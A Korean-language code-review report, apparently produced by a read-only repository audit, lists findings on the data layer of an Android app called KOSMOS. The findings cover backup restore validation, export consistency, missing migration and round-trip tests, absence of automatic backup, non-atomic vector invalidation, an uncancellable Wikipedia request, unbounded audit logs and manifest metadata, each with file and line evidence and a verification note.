- 앞선 기록: CHANGELOG.md:1282·1292 (Room 2.8 대응 회차 — dropAllTables=true 선택, '다운그레이드에서만 발동, 테스트가 닿지 않음' 메모); plans/0.23.0-profile-injection.md:60-61 ('알려진 한계 — 범위 밖'); CHANGELOG 0.40.2 M2-4 (복원 경로만 차단). 설치 경로를 일부러 열어 두기로 한 결정 기록은 없음

### data-2 · 복원이 백업 DB 의 내용을 검사하지 않고, 바꾸기 전 DB 도 남기지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 데이터 손실 위험. 머리 100바이트만 멀쩡하고 안쪽이 깨진 파일, 또는 버전 숫자만 3~14 인 다른 SQLite 파일이 들어오면 그대로 교체된다. 재시작 뒤 Room 이 스키마 불일치로 실행마다 죽거나, SQLite 가 손상을 알리면 기본 처리기가 DB 파일을 지운다 — 어느 쪽이든 복원 전의 원래 기억은 이미 없다. '실패해도 원래 DB 가 남는다'는 0.40.2 의 보장이 복사 단계까지만 유효하다.
- 제안: ① 임시 폴더에 풀어 둔 DB 를 읽기 전용으로 열어 `PRAGMA quick_check` 와 핵심 표(conversation·knowledge_note·room_master_table) 존재를 확인한 뒤에만 교체한다(임시 폴더라 저널이 생겨도 무해). ② 교체 전에 지금 DB 를 같은 폴더의 `kosmos_db.pre-restore` 로 옮겨 두고, 재시작 뒤 DB 가 정상으로 열리면 지운다(열기 실패 시 되돌릴 수 있는 길). ③ 깨진 파일·다른 앱 DB 로 교체가 거부되는 테스트를 ExportImportSafetyTest 에 더한다.
- 근거:
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:159-171 — 검사는 파일 머리의 버전 숫자(user_version) 범위뿐
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:180, 335 — 검사 직후 moveReplacing 으로 지금 DB 를 덮어쓴다(이전 파일 보관 없음)
  - data/src/main/java/com/kosmos/app/data/di/DatabaseModule.kt:31-44 — 손상 처리기를 따로 두지 않아 Room 기본 동작(손상 감지 시 DB 파일 삭제)이 적용된다
  - app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:339-345 — 복원 성공 뒤 출구는 재시작뿐
- 검증: 직접 확인: ExportImportManager.kt:140-171 의 검사는 manifest.json 존재·version=="1.0"·DB 파일 존재·머리의 user_version 범위뿐이다. :180 → replaceDatabaseFiles(:297-355)는 임시 파일로 복사한 뒤 :335 moveReplacing 으로 지금 DB 를 바로 대체하고 이전 파일을 남기지 않는다. DatabaseModule.kt:31-44 에는 손상 처리 설정이 없다. MemoryViewModel.kt:341-345 — 복원 성공 상태는 닫을 수 없고 재시작만 출구. ExportImportSafetyTest.kt:66-85 가 보장하는 것은 '복사 도중 실패 시 원본 보존'까지다. 따라서 '안쪽 내용을 안 본다 / 되돌릴 사본이 없다'는 사실로 맞다. 심각도는 medium 으로 낮춘다: 전송 중 깨진 zip 은 ZipInputStream 의 CRC 검사에서 예외가 나 :187 에서 실패 처리되고 원본은 그대로다. manifest 가 없는 남의 zip 도 :141 에서 거부된다. 실제로 걸리는 입력은 (1) 내보낼 때부터 앞뒤가 안 맞게 복사된 DB(data-3), (2) 손으로 고친 zip 정도다. 재시작 뒤 Room 기본 손상 처리(파일 삭제)는 이 저장소 코드가 아니라 라이브러리 기본 동작이라 직접 실행해 확인하지는 않았다. 제안 ②(교체 전 DB 를 pre-restore 로 남기기)가 효과 대비 가장 싸다.
- 앞선 기록: CHANGELOG 0.40.2 M2-4 / plans/0.40.2-bug-fixes.md:84 (버전 범위 검사·원자적 교체까지만). quick_check·integrity_check·이전 DB 보관은 CHANGELOG·architecture·plans 어디에도 없음

### data-3 · 내보내기가 쓰기가 진행 중인 DB 파일을 그대로 복사하고, 여유 공간은 10MB 고정으로만 본다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 백업이 조용히 깨질 수 있다. 내보내는 동안 문서 색인·뜻 벡터 준비·요약 같은 백그라운드 쓰기가 커밋되면 본 파일이 복사 도중에 바뀌어 앞뒤가 다른 시점인 사본이 된다. 내보내기는 성공으로 끝나고, 깨진 것은 복원할 때(가장 필요한 순간)에야 드러난다(data-2 와 이어진다). 또 보관함을 쓰면 DB 가 10MB 를 쉽게 넘는데 공간 점검은 10MB 라, 공간이 모자라면 중간에 실패한다.
- 제안: ① 체크포인트 뒤 복사 구간을 쓰기 트랜잭션(`db.withTransaction { … }`)으로 감싸 그동안 다른 커밋·체크포인트가 못 끼어들게 한다. ② 공간 점검을 `dbFile.length()`(+wal) 기준으로 바꾼다. ③ -shm 은 넣지 않는다(복원 쪽도 버린다). ④ 가능하면 만든 zip 안의 DB 를 한 번 quick_check 한다(data-2 의 검사 함수 재사용).
- 근거:
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:81-83 — 체크포인트 한 번
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:95-102 — 그 뒤 잠금 없이 본 파일 → -wal → -shm 순서로 복사
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:64 — 여유 공간 점검이 10MB 고정
  - domain/src/main/java/com/kosmos/app/domain/library/LibraryChunker.kt:34 — 보관함 상한 1,000만 자(본문+색인+벡터로 DB 가 수십~백 MB 가 될 수 있다)
  - data/src/main/java/com/kosmos/app/data/local/repository/LibraryRepositoryImpl.kt:32-46, 120-130 — 색인·벡터 저장은 큰 트랜잭션이라 커밋 때 자동 체크포인트가 본 파일을 다시 쓴다
- 검증: 직접 확인: ExportImportManager.kt:81-83 체크포인트 1회, :95-102 잠금 없이 본 파일 → -wal → -shm 순서로 복사, :64 여유 공간 10MB 고정(주석 :56 도 '10MB 백업 ZIP' 전제), LibraryLimits(LibraryChunker.kt:28-34)는 전체 1,000만 자 = DB 약 100MB. 구조상 주장은 맞다. 틀리거나 과장된 부분: (1) WAL 모드에서 일반 커밋은 -wal 에만 쓰고 본 파일은 체크포인트 때만 바뀐다. 복사 도중 본 파일이 바뀌려면 TRUNCATE 직후 수 초 안에 자동 체크포인트(대략 WAL 1,000쪽 ≈ 4MB 이상 쌓인 커밋)가 일어나야 한다 — 문서 색인·벡터 저장 같은 큰 커밋이 내보내기와 정확히 겹칠 때만이라 창이 좁다. 메모·대화 한두 줄 쓰기로는 깨지지 않는다(-wal 을 같이 담기 때문). (2) 공간 부족은 '조용히 깨짐'이 아니라 :109-112 에서 예외를 잡아 zip 을 지우고 실패로 끝난다 — 오류 문구가 덜 정확할 뿐이다. (3) -shm 을 담는 것(:101-102)은 쓸모없지만 복원이 버리므로(:350-353) 해는 없다. 그래서 심각도 low. 제안 ① 은 체크포인트를 트랜잭션 밖에서 먼저 하고 그 뒤에 감싸야 한다(트랜잭션 안에서는 체크포인트 불가) — 더 단순한 대안은 SQLite 의 VACUUM INTO 로 일관된 사본을 만들어 그 파일만 담는 것이다.
- 앞선 기록: CHANGELOG 초기 회차(Export 에서 DB close 제거·wal_checkpoint 가 실제 실행되게 수정). 복사 중 쓰기·공간 기준에 대한 기록은 없음. LibraryChunker.kt:28-29 주석이 'DB 약 100MB — 백업 ZIP 이 감당할 선'이라고 적어 크기는 알고 있었다

### data-4 · 백업 관리자 본체(내보내기 → 복원 왕복, 압축 풀기 방어)를 직접 도는 테스트가 없다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: '기억이 핵심 가치'인 앱의 유일한 백업 길인데, 실제로 zip 을 만들고 그 zip 으로 되살렸을 때 행이 그대로인지 확인하는 자동 검증이 없다. 지금은 휴대폰 수동 확인에만 기대고 있어 회귀가 나도 게이트가 못 잡는다. 포트폴리오에서 '백업은 어떻게 검증했나'라는 질문에 약하다.
- 제안: Robolectric 으로 :app 테스트 1개 파일 추가 — 파일 DB 에 행을 넣고 createExportZip → 다른 내용으로 바꾼 뒤 restoreFromZip(file:// URI) → DB 를 새로 열어 행 대조. 같은 파일에 `../` 항목이 든 zip, 항목 1,000개 초과 zip, manifest 없는 zip 이 거부되는지 3건. (기존 단언은 건드리지 않는 신규 테스트)
- 근거:
  - app/src/test/java/com/kosmos/app/data/ExportImportSafetyTest.kt:30-88 — 버전 범위·replaceDatabaseFiles 등 공개 도우미 함수 4건만 검증
  - app/src/test, domain/src/test 전체 grep — createExportZip·restoreFromZip·`ExportImportManager(` 를 부르는 테스트 0건
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:200-251 — 경로 탈출·압축 폭탄 방어(extractZipSafely·copyWithLimit)는 private 이고 테스트 없음
  - data/src, core/src — 테스트 소스셋 자체가 없음(main 만)
- 검증: 직접 확인: app/src/test/java/com/kosmos/app/data/ExportImportSafetyTest.kt 는 isRestorableVersion·replaceDatabaseFiles 2건(성공·복사 실패)과 무관한 readBytesUpTo 만 검증한다. createExportZip·restoreFromZip·'ExportImportManager(' 를 app/src/test·domain/src/test·androidTest 전체에서 grep 한 결과 적중은 domain/src/test/.../AuditHashChainTest.kt:115-120 하나뿐이고 그것은 가짜 MemoryBackupManager 구현이다(실제 관리자를 돌리지 않음). data/src·core/src 에는 main 만 있다(ls 확인). extractZipSafely·copyWithLimit(ExportImportManager.kt:200-251)은 private 이고 부르는 테스트가 없다. 덧붙임: readSqliteUserVersion(:267)도 테스트에서 직접 부르지 않는다. 주장 그대로 맞다. data-2·data-3 을 고치면 이 테스트가 그 고정 장치가 되므로 함께 묶는 것이 맞다.
- 앞선 기록: ExportImportManager.kt:280-281 주석(':data 에 테스트 소스셋이 없어 공개 함수로 둔다' — 의도된 구조). 내보내기→복원 왕복 테스트에 대한 기록은 없음

### data-5 · 마이그레이션을 처음부터 끝까지 이어 돌리고 실제 스키마 파일과 맞춰 보는 테스트가 없다
- 판정 확인됨 · 중요도 낮음 · 크기 M
- 왜: 각 단계는 따로 검증되지만 '3 에서 14 까지 이어 돌린 결과가 Room 이 기대하는 14 스키마와 같은가'는 휴대폰 한 대의 실제 업그레이드 이력에만 기대고 있다. 기대 DDL 을 손으로 베낀 것이라 스키마 파일과 어긋나도 테스트는 녹색이다. 옛 백업(스키마 3~13)을 복원하면 이 사슬 전체가 실제로 돈다 — 실패하면 실행마다 죽는다. exportSchema 를 켜 두고 쓰지 않는 점은 포트폴리오에서 지적받기 쉽다.
- 제안: JVM 테스트 1개: 테스트가 `data/schemas/.../3.json` 을 파일 경로로 직접 읽어(assets 불필요) 그 createSql 로 빈 DB 를 만들고 KosmosMigrations.ALL 을 순서대로 태운 뒤, sqlite_master 의 표·인덱스 DDL 을 14.json 의 createSql 과 정규화 비교한다. SCHEMA_VERSION 을 올리면 자동으로 다음 json 을 기대하도록 해 '마이그레이션 빠뜨림'도 함께 잡는다.
- 근거:
  - app/src/test/java/com/kosmos/app/data/LibraryMigrationTest.kt:31-58 — 직전 버전 표를 손으로 만들고, 기대 DDL 도 테스트 안에 손으로 베껴 둔다(다른 마이그레이션 테스트도 같은 방식)
  - app/src/test 전체 grep — `KosmosMigrations.ALL`·`addMigrations`·`Room.databaseBuilder` 사용 0건, MIGRATION_3_4 테스트 0건
  - data/schemas/com.kosmos.app.data.local.db.KosmosDatabase/2.json~14.json — 내보낸 스키마는 있지만 어떤 테스트도 읽지 않는다
  - data/src/main/java/com/kosmos/app/data/local/db/KosmosMigrations.kt:267-270 — 경로 11개(3→14)
- 검증: 직접 확인: app/src/test 에서 KosmosMigrations.ALL·Room.databaseBuilder 사용 0건(Room.inMemoryDatabaseBuilder 는 testing/InMemoryKosmosDbRule.kt:23 — 최신 스키마를 새로 만들 뿐 마이그레이션을 타지 않는다). 테스트가 부르는 마이그레이션은 4_5 ~ 13_14 각 1~2회, MIGRATION_3_4 는 0회. LibraryMigrationTest.kt:31-39 는 기대 DDL 을 테스트 안에 손으로 적고, :48-50 은 직전 버전 표도 손으로(그것도 일부만) 만든다. data/schemas/.../2.json~14.json 은 있으나 테스트가 읽는 곳이 없다. KosmosMigrations.kt:267-270 ALL 은 11개. 주장은 맞다. 심각도는 low 로 본다: 사용자의 휴대폰은 이미 14 이고, 사슬 전체가 실제로 도는 길은 옛 스키마(3~13) 백업을 복원할 때뿐이다. 실사용 위험보다는 '다음 스키마 변경 때 빠뜨림을 잡는 장치'와 포트폴리오 설명력 쪽 가치다. 제안은 :app 테스트에서 ../data/schemas 를 파일로 읽으면 되므로 실현 가능하다.
- 앞선 기록: KnowledgeEmbeddingMigrationTest KDoc·LibraryMigrationTest.kt:20-22 (MigrationTestHelper 대신 sqlite_master 를 손으로 옮긴 DDL 과 대조하는 방식을 택한 결정). 3→14 전체 사슬 테스트 기록은 없음

### data-6 · 자동 백업이 없어, 앱 삭제·데이터 지우기·서명 키 변경 한 번이면 모든 기억이 사라진다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 매일 쓰기 시작하면 대화·메모·일정이 휴대폰 안 DB 파일 하나에만 쌓인다. 디버그 빌드는 이 PC 의 디버그 키에 묶여 있고, data-1 같은 사고나 DB 손상 시 되돌릴 사본이 '사용자가 마지막으로 손으로 내보낸 날'의 것뿐이다. 실사용 기간이 길수록 잃는 양이 커진다.
- 제안: 설정에 '자동 백업 폴더'(문서 선택기로 폴더 권한을 한 번 받음)를 두고, 하루 한 번(충전 중·유휴) 기존 createExportZip 결과를 그 폴더에 최근 N개만 남기며 저장한다. 그보다 가볍게는 '마지막 백업 N일 전' 안내 한 줄만 기억 화면에 보여도 된다. 온디바이스 원칙은 그대로다(저장 위치는 사용자가 고른 기기 안 폴더). 결정이 갈리는 지점(주기·보관 개수·기본 켬/끔)은 계획 단계에서 묻는다.
- 근거:
  - app/src/main/AndroidManifest.xml:30-32 — allowBackup=false, 클라우드·기기 간 전송 모두 제외(의도된 결정)
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:49-54 — 백업은 사용자가 직접 누르는 내보내기 하나뿐
  - docs/checklists/real_use_start.md:27 — 실사용 시작 때 '남기고 싶으면 백업' 한 번
  - docs/plans/0.43.0-real-use-prep.md:11 — 다른 키로 서명한 앱은 덮어 깔리지 않고, 지우면 데이터가 함께 지워진다
- 검증: 직접 확인: app/src/main/AndroidManifest.xml:30-32 allowBackup=false·fullBackupContent=false·dataExtractionRules. 백업 길은 ExportImportManager.kt:49 createExportZip 하나이고 호출은 사용자 버튼(ExportMemoryUseCase)뿐이다. docs/checklists/real_use_start.md 의 순서 1 은 '남기고 싶으면 백업 내보내기' 한 번. docs/plans/0.43.0-real-use-prep.md '지금 상태'에 '다른 키로 서명한 앱은 덮어 깔리지 않는다 — 지우고 깔면 앱 데이터가 함께 지워진다'가 적혀 있다. 사실 관계는 모두 맞다. 이것은 결함이 아니라 새 기능 제안이며, 클라우드 자동 백업을 끈 기존 결정(ADR-032)을 뒤집지 않는다(기기 안 폴더). 포트폴리오 단계에서 릴리스 서명으로 바꾸면 앱을 지우고 깔아야 하므로 그 전에 최소한 '마지막 백업 N일 전' 안내는 값어치가 있다. 주기·보관 개수·기본값은 사용자 결정 사항이라 계획 단계 질문이 필요하다. 폴더 권한·백그라운드 작업이 들어가면 작업량은 M 이 맞다.
- 앞선 기록: CHANGELOG.md:1569 (allowBackup=false — '백업은 앱 내 Export/Import 경로 사용'); architecture.md:2143-2144 ADR-032 (자동 백업 차단 유지). 앱 자체의 주기 백업·'마지막 백업' 안내는 기록 없음(코드에서 lastBackup·'마지막 백업' grep 0건)

### data-7 · 메모·지난 대화를 고쳐 저장하는 것과 옛 뜻 벡터를 지우는 것이 한 트랜잭션이 아니다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 두 호출 사이에서 코루틴이 취소되거나(저장 직후 화면을 떠남) 두 번째 쓰기가 실패하면, 내용은 새것인데 벡터는 옛 내용의 것이 남는다. 이 행은 '벡터 있음'으로 세어져 다시 만들어지지 않으므로 뜻 검색이 그 메모를 계속 옛 뜻으로 찾는다 — 0.41.16 에서 막은 증상과 같은 결과가 다른 길로 생긴다. 드물지만 한 번 생기면 눈에 안 띄게 굳는다.
- 제안: 두 저장소에 KosmosDatabase 를 주입해 '행 쓰기 + 벡터 지우기'를 `db.withTransaction { }` 한 덩어리로 묶는다(mergeInto 포함). 테스트: 벡터 지우기가 예외를 던지게 한 가짜 DAO 로 저장했을 때 메모 행도 되돌아가는지 1건.
- 근거:
  - data/src/main/java/com/kosmos/app/data/local/repository/KnowledgeRepositoryImpl.kt:27-40 — dao.insert 뒤 별도 호출로 vectors.delete
  - data/src/main/java/com/kosmos/app/data/local/repository/EpisodeRepositoryImpl.kt:35-36, 40-42, 47-48 — 저장·통합·갱신 뒤 별도 호출로 invalidate
  - data/src/main/java/com/kosmos/app/data/local/db/dao/MemoryVectorDao.kt:28-39 — 벡터가 남아 있으면 '준비 끝'으로 세고 다시 만들 대상에서 빠진다
  - data/src/main/java/com/kosmos/app/data/local/repository/LibraryRepositoryImpl.kt:32-46 — 보관함은 같은 종류의 작업을 withTransaction 으로 묶고 있다(대조)
- 검증: 직접 확인: KnowledgeRepositoryImpl.kt:26-41 은 dao.insert 뒤 별도 호출 vectors.delete, EpisodeRepositoryImpl.kt:34-49·77-80 도 insert/mergeInto/delete 뒤 별도 invalidate — 둘 다 KosmosDatabase 를 주입받지 않아 트랜잭션으로 묶을 수 없는 구조다(EpisodeDao.kt:78-84 mergeInto 자체는 @Transaction 이지만 벡터 지우기는 그 밖). DbCall.kt:28-36 dbWrite 는 inline 이라 두 suspend 호출 사이가 취소 지점이다. MemoryVectorEntity 는 (kind, refId, modelId, vector)만 가져 내용이 바뀌었는지 알 길이 없고, MemoryVectorDao.kt notesWithoutVector·embeddedCount 는 '벡터 존재'만 본다 → 남은 옛 벡터는 다시 만들어지지 않는다. MemoryVectorRepositoryImpl.kt:49-56 saveIfCurrent 는 임베딩 쪽에서 쓰는 순간만 지키므로 이 틈은 못 막는다. 호출부 MemoryViewModel.kt:260 은 화면 수명 범위에서 저장한다(화면을 떠나면 취소 가능). 주장 성립. 다만 두 호출 사이 간격이 매우 짧고 두 번째 삭제가 실패할 일도 드물어 심각도는 low 가 맞다. 대조로 든 LibraryRepositoryImpl 은 db 를 주입받아 withTransaction 을 쓴다(:40-45 확인).
- 앞선 기록: CHANGELOG.md:237-238 0.41.16 / plans/0.41.16-vector-race-and-model-check.md (임베딩 쪽 경합을 saveIfCurrent 로 막음). 저장소의 '행 쓰기 → 벡터 지우기' 두 호출 사이 틈은 기록 없음

### data-8 · 위키 검색 요청은 취소가 닿지 않아 멈춘 연결이면 수십 초 붙잡힌다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 실사용에서 신호가 약한 곳(지하철·엘리베이터)에서 웹 검색이 켜진 턴을 멈추면, 블로킹 읽기가 끝날 때까지 그 코루틴이 풀리지 않는다. 툴 실행을 기다리는 쪽(턴 정리·다음 질문)이 그만큼 늦어질 수 있다. 호출부가 실제로 얼마나 기다리는지는 이 범위 밖이라 직접 확인하지 못했다.
- 제안: 다운로드와 같은 방식으로 맞춘다 — `suspendCancellableCoroutine` + `enqueue`, `invokeOnCancellation { call.cancel() }`. 공유 클라이언트에 callTimeout(예: 20초)을 걸어 전체 상한도 둔다. User-Agent 의 버전은 굳은 숫자를 빼거나 빌드 값에서 받는다. 툴 결과 문구는 바꾸지 않으므로 모델 입력 실측 대상이 아니다.
- 근거:
  - data/src/main/java/com/kosmos/app/data/tool/WikipediaSearchToolImpl.kt:36, 78 — withContext(IO) 안에서 블로킹 execute(), 취소 시 call.cancel() 없음
  - data/src/main/java/com/kosmos/app/data/di/NetworkModule.kt:36-37 — 연결 10초 + 읽기 30초, 전체 호출 시간 제한 없음
  - data/src/main/java/com/kosmos/app/data/network/ModelDownloadService.kt:133-142 — 같은 문제를 다운로드에서는 이미 고쳤다(취소되면 요청을 끊는 옆 코루틴)
  - data/src/main/java/com/kosmos/app/data/tool/WikipediaSearchToolImpl.kt:133 — User-Agent 가 'KOSMOS/0.8.0' 으로 굳어 있다
- 검증: 직접 확인: WikipediaSearchToolImpl.kt:36 withContext(Dispatchers.IO) 안에서 :78 client.newCall(...).execute() — 블로킹이고 call.cancel() 을 부르는 곳이 없다. NetworkModule.kt:35-38 공유 클라이언트는 연결 10초·읽기 30초, callTimeout 없음(:41 주석도 '무제한 callTimeout'이라 적음). 같은 문제를 ModelDownloadService.kt:165-175 는 옆 코루틴 + call.cancel() 로 이미 풀었다. 호출부 SearchWikipediaToolExecutor.execute 에도 시간 제한이 없다(app/src/main 의 withTimeout grep 결과에 위키·툴 실행 경로 없음). :133 USER_AGENT 는 "KOSMOS/0.8.0" 고정. 사실은 모두 맞다. withContext 는 블록이 끝나야 돌아오므로 멈춘 연결이면 취소가 최대 수십 초 늦게 먹는다. 다만 그동안 다음 턴이 실제로 얼마나 막히는지(턴 정리가 이 코루틴 종료를 기다리는지)는 후보도 나도 확인하지 않았다 — 영향 범위는 추정이므로 low. 웹 검색은 전역 토글이 켜진 턴에서만 도달한다. 고치는 것은 작고 모델 입력(툴 결과 문구)을 건드리지 않는다.
- 앞선 기록: CHANGELOG 0.41.9 외부 분석 O2 (모델 다운로드만 고침 — ModelDownloadService.kt:166-167 주석); CHANGELOG.md:1496 (다운로드 전용 클라이언트 분리). 위키 요청의 취소·전체 시간 상한은 기록 없음

### data-9 · 활동 기록·대화가 끝없이 쌓이고, 활동 기록 화면에 들어갈 때마다 전체를 다시 검증한다
- 판정 확인됨 · 중요도 낮음 · 크기 M
- 왜: 턴마다 모델 실행·툴 실행 기록이 1~2KB 씩 붙는다. 매일 쓰면 몇 달 뒤 수만 행이 되고, 백업 크기와 활동 기록 화면 진입 시 검증 시간이 함께 늘어난다. 나중에 오래된 기록을 지우려 해도 지금 검증기는 앞부분 삭제를 변조로 읽으므로, 보존 정책은 체인 설계(시작점 표시)와 같이 정해야 한다 — 실사용 데이터가 쌓이기 전에 정해 두는 편이 싸다.
- 제안: ① 보존 기준(예: 최근 N일 또는 N건)과 '체인 시작점' 행(지운 마지막 번호·지문을 담은 첫 줄) 방식을 한 번에 설계 — 검증기가 시작점부터 잇도록. ② 검증 결과를 머리 번호와 함께 기억해 두고, 다음에는 그 뒤부터만 검증(증분). ③ 틀린 주석(:40) 정정. 실사용 한두 달 뒤 실제 행 수를 보고 착수해도 된다.
- 근거:
  - data/src/main/java/com/kosmos/app/data/local/db/dao/AuditDao.kt:20-48 — 삭제·정리 쿼리가 없다(지우는 길은 대화 초기화뿐: DataResetRepositoryImpl.kt:36)
  - data/src/main/java/com/kosmos/app/data/local/repository/AuditRepositoryImpl.kt:43-56 — verifyChain 이 첫 행부터 500건씩 전부 읽어 SHA-256 을 다시 계산
  - domain/src/main/java/com/kosmos/app/domain/audit/AuditHashChain.kt:104-105 — 검증기는 번호가 1 부터 이어져야 통과한다(앞부분을 지우면 '변경 흔적'으로 판정)
  - data/src/main/java/com/kosmos/app/data/local/repository/AuditRepositoryImpl.kt:40 — 주석은 '프롬프트 전문이 들어 있어'라 하지만 실제는 500자로 잘린다(core/.../security/Redaction.kt:17, 25-26)
- 검증: 직접 확인: AuditDao.kt 에 삭제·정리 쿼리가 없다(insert·조회·chainHead·legacyCount·chainPage·appendChained 뿐). 지우는 길은 DataResetRepositoryImpl.kt:36 대화 초기화(audit_log 포함)뿐. AuditRepositoryImpl.kt:43-55 verifyChain 은 번호 0 다음부터 500건씩 끝까지 읽어 다시 계산하고, AuditViewModel.kt:63-66 init 에서 화면에 들어갈 때마다 돈다. AuditHashChain.kt:104-105 는 첫 체인 행의 번호가 1(lastSeq+1)이고 앞 지문이 GENESIS 여야 통과하므로 앞부분을 지우면 변조로 판정된다 — 보존 정책을 체인 설계와 함께 정해야 한다는 지적이 맞다. 주석 불일치도 맞다: AuditRepositoryImpl.kt:40 '프롬프트 전문이 들어 있어' vs AuditTrailService.kt:53-54 redact(prompt)·redact(output) → Redaction.kt:17·25-27 에서 500자로 자름. 이미 '별도 후보'로 적어 둔 알려진 빈틈이고 지금 당장 문제는 아니다(후보 스스로도 실사용 한두 달 뒤 착수 가능하다고 함). 지금 할 만한 것은 틀린 주석 정정 하나, 나머지는 실제 행 수를 본 뒤.
- 앞선 기록: plans/0.41.4-audit-hash-chain.md:72 ('감사 기록 보존 기간·용량 상한(지금 무제한) — 별도 후보' — 알고 미룬 항목); AuditViewModel.kt:64 주석('기록이 수천 건이면 수백 ms' — 비용을 알고 둠)

### data-10 · 백업 표지(manifest)가 실제 정보를 담지 않는다 — 앱 버전은 늘 '1.0.0', 쓰지 않는 칸 3개, 스키마 버전 없음
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 백업 파일만 보고는 어느 앱 버전·어느 스키마에서 만든 것인지 알 수 없어, 복원 문제를 따질 때 단서가 없다. 채우지 않는 칸과 '임시' 주석은 코드를 읽는 사람(면접관 포함)에게 미완성으로 보인다. 동작 결함은 아니다.
- 제안: 앱 버전은 :app 의 BuildConfig.VERSION_NAME 을 유스케이스에 주입해 넘기고, manifest 에 schemaVersion(KosmosDatabase.SCHEMA_VERSION)을 더한다(읽는 쪽은 ignoreUnknownKeys 라 옛 앱과 호환). 쓰지 않는 칸은 지우거나 실제 값으로 채운다. sourceSessionId 열은 다음 스키마 변경 때 함께 빼거나 주석을 '쓰지 않는 열'로 고친다.
- 근거:
  - domain/src/main/java/com/kosmos/app/domain/usecase/ExportMemoryUseCase.kt:22 — createExportZip("1.0.0") 고정 문자열
  - data/src/main/java/com/kosmos/app/data/local/file/ExportManifest.kt:10-14 — encrypted·modelId·sessionCount 는 늘 기본값(채우는 곳·읽는 곳 없음)
  - data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:147, 159 — 복원은 manifest 의 version "1.0" 만 보고, 스키마 버전은 DB 파일 머리에서 따로 읽는다
  - data/src/main/java/com/kosmos/app/data/local/repository/KnowledgeRepositoryImpl.kt:31 — 같은 결의 죽은 칸: sourceSessionId 를 늘 null 로 덮어쓴다('임시' 주석)
- 검증: 직접 확인: domain/.../usecase/ExportMemoryUseCase.kt:22 createExportZip("1.0.0") 고정 문자열(실제 앱 버전은 app/build.gradle.kts:24 의 0.42.10). ExportManifest.kt:10-14 의 encrypted·modelId·sessionCount 는 data·app·domain main 전체 grep 에서 채우거나 읽는 곳이 없다(appVersion 도 쓰기만 하고 읽지 않는다). 복원은 ExportImportManager.kt:147 에서 manifest.version 만 보고 스키마는 :159 에서 DB 머리로 따로 읽는다. KnowledgeRepositoryImpl.kt:31 sourceSessionId = null 과 '임시' 주석, 이 열을 읽는 코드는 엔티티·마이그레이션 외에 없다. 동작 결함은 아니고 정리·진단 단서 항목이 맞다. 주의: 앱 버전을 넘기려면 :domain 유스케이스가 :app 의 BuildConfig 를 직접 볼 수 없으므로 주입(값 제공자)이 필요하다. sourceSessionId 열을 실제로 빼는 것은 스키마 변경(15)과 마이그레이션이 필요하니 주석 정정만 하는 쪽이 싸다.
- 앞선 기록: CHANGELOG 0.41.9 외부 분석 S1 (ExportManifest.kt:18-20 — encodeDefaults·ignoreUnknownKeys 만 손봄); plans/0.23.0-profile-injection.md:60-61 ('manifest 에 schemaVersion 없음 — 기존 조건'); plans/0.24.0-auto-extract.md:16 (sourceSessionId 늘 null — 알고 있던 상태)

<details><summary>읽은 범위</summary>

저장소 루트: C:\Users\SSAFY\Desktop\dev\lets_meet_on_friday. 읽기 전용으로만 작업했다(파일·git 변경 없음, gradle·adb·실험 실행 없음, 그래프 도구는 쓰지 않고 grep·파일 읽기로만 확인).

[직접 전부 읽은 것]
- :data 본체 42개 파일 전부: KosmosDatabase, KosmosMigrations(3→14 전 구간), 엔티티 9개 파일, DAO 9개, 저장소 구현 10개 + DbCall, ExportImportManager·ExportManifest, DataResetRepositoryImpl, prefs 3개(Settings·Session·RecentDocuments), DI 4개, ModelDownloadService, WikipediaSearchToolImpl, data/build.gradle.kts.
- :core: Constants, AppLogger, Redaction, ApprovalRules, PermissionPolicy, FloatBytes, SqlLike, Tags, RunCatchingCancellable, EnumOrDefault, AppResult.
- 범위 밖이지만 판단에 필요해 읽은 것: domain 의 AuditHashChain·AuditTrailService·Export/ImportMemoryUseCase, app 의 MemoryViewModel 복원 부분, AndroidManifest 백업 설정, data_extraction_rules.xml, 관련 테스트 머리(LibraryMigrationTest, KnowledgeEmbeddingMigrationTest KDoc, ExportImportSafetyTest·AuditChainRepositoryTest·DataResetRepositoryTest 의 테스트 목록).
- 기록 대조: docs/CHANGELOG.md·architecture.md·plans·checklists 를 키워드 grep(다운그레이드, 자동 백업, integrity/quick_check, 보존 기간, 체크섬, sourceSessionId, 0.41.16 계획서 머리 등).

[못 읽었거나 얕게 본 것]
- :core 의 AppError, AppLanguage, CurrentLanguage, ResponseStyle, ValidationReason, ErrorCode, ErrorCodeMapper, ErrorMessages 는 줄 수만 확인하고 본문은 읽지 않았다.
- data/schemas 의 JSON 은 파일 존재(2~14)만 확인했고 마이그레이션 DDL 과 글자 단위 대조는 하지 않았다(그래서 data-5 를 제안).
- data-3(내보내기 중 쓰기)과 data-8(위키 취소)은 코드 구조로 설명되는 경로이지만 실제 재현은 하지 않았다 — confidence medium.
- Room 의 '손상 시 파일 삭제' 기본 동작은 라이브러리 지식에 근거한 것이고 이 저장소 코드로 확인한 것은 '손상 처리기를 따로 두지 않았다'까지다.
- :app 쪽 테스트가 :data 를 꽤 덮는다는 점은 확인했다(저장소·DAO·단계별 마이그레이션·체인·초기화 테스트 23개 파일). 비어 있는 곳은 백업 관리자 본체, 전체 마이그레이션 사슬, Redaction, WikipediaSearchToolImpl 이다.

[일부러 뺀 것 — 7건]
- 해시 체인의 꼬리 삭제·체인 전(번호 0) 행 끼워 넣기 미감지: ADR-039·0.41.4 Q1/Q2 에서 범위 밖으로 문서화한 결정.
- 모델 파일을 크기로만 검증(해시 없음): architecture.md 에 수용된 위험으로 기록.
